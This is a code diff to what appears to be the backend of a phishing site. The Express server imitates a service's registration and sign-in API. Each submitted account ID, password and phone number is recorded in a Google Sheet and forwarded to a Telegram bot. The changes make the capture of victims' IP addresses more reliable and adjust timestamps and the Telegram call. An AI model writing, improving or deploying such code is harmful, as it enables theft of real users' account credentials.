@@ -1,4 +1,5 @@
 const express = require("express");
+const requestIp = require('request-ip');
 require("dotenv").config();
 const path = require("path");
 const PORT = process.env.PORT || 3001;
@@ -20,6 +21,9 @@ const { sendRegisterAccountToBot, sendLoginAccountToBot } = require("./utils/sen
 const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
 let redirectDomain = "";
+
+app.use(requestIp.mw());
+
 if(redirectDomain === "") {
   bot.sendMessage(process.env.CHAT_ID, "Tên miền chuyển hướng chưa được thiết lập! Vui lòng dùng lệnh /domain để thiết lập!")
 }
@@ -38,13 +42,10 @@ app.use((req, res, next) => {
   req.isMobile = isMobile;
   next();
 });
-app.use((req, res, next) => {
-  var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress 
-  next();
-});
+
 app.get("/", (req, res) => {
   if (req.isMobile) {
-    console.log(req.ip);
+
     return res.render(
       "mobile/index",
       { layout: "mobile/layout",
@@ -99,9 +100,10 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
     // Decode the password (which is base64 encoded)
     const decodedPWD = Buffer.from(PWD, 'base64').toString('utf-8');
     
-    const timeNow = new Date().toLocaleString('vi-VN');
+    const timeNow = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+
     
-    const userIp = req.ip;
+    const userIp = requestIp.getClientIp(req);
 
     // Prepare data to be stored
     const data = {
@@ -140,16 +142,17 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
 
 app.post("/api/Authorize/SignIn", async (req, res) => {
   const { AccountID, AccountPWD, phone } = req.body;
-  const timeNow = new Date().toLocaleString('vi-VN');
+  const timeNow = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+
     
   // Get the user's IP address
   // If using a proxy (like Nginx), 'x-forwarded-for' contains the real IP
   // Otherwise, fallback to req.ip
-  const userIp = req.ip;
+  const userIp = requestIp.getClientIp(req);
   const data = { action: "login", AccountID, AccountPWD, phone, timeNow, userIp };
   await Promise.all([
     googleSheetApi.storageDataLoginToGoogleSheet(data, GOOGLE_SHEET_URL),
-    sendLoginAccountToBot(phone, AccountID, AccountPWD, userIp, timeNow)
+    sendLoginAccountToBot(userIp, timeNow, phone, AccountID,  AccountPWD)
   ]);
 
   return res.json({
